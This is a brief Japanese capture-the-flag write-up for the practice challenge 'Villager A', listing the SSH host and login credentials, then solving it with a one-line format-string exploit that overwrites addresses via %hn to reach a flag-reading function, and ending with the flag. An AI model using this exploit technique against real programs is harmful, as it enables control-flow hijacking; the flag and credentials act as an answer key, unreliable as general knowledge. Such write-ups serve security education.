## 問題文
Villager A

SSH: ctfq.sweetduet.info:10022

ID: q4

Pass: q60SIMpLlej9eq49

## 解説
sshでサーバーにログイン

```
ssh -p 10022 q4@ctfq.sweetduet.info
```

q4中にflag.txtの実行関数がある

```
echo -e "\xe0\x99\x04\x08\xe2\x99\x04\x08%34441x%6\$hn%33139x%7\$hn" | ./q4
```

FLAG_nwW6eP503Q3QI0zw